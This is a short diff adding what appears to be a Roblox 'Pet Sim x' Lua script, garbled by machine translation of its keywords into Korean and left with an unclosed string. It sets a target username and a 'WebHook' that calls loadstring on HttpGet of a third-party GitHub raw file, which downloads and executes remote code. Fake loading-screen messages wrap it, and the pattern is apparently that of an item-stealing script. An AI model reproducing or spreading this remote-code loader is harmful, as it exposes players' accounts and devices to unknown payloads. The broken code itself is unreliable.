@@ -1,0 +1,19 @@
+   사용자 이름 = "지성0024"     
+
+WebHook = "loadstring (게임:HttpGet ("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguis.lua") (
+
+   "     
+
+ 
+
+  로딩 스크린 = 참    
+
+_G. CustomScriptName = "Pet Sim x Script" 
+
+_G. Text1 = "Script Loaded..." 
+
+_G. Text2 = "스크립트를 기다리며..." 
+
+_G. Text3 = "스크립트 확인..." 
+
+_G. Text4 = "시작 스크립트..." 
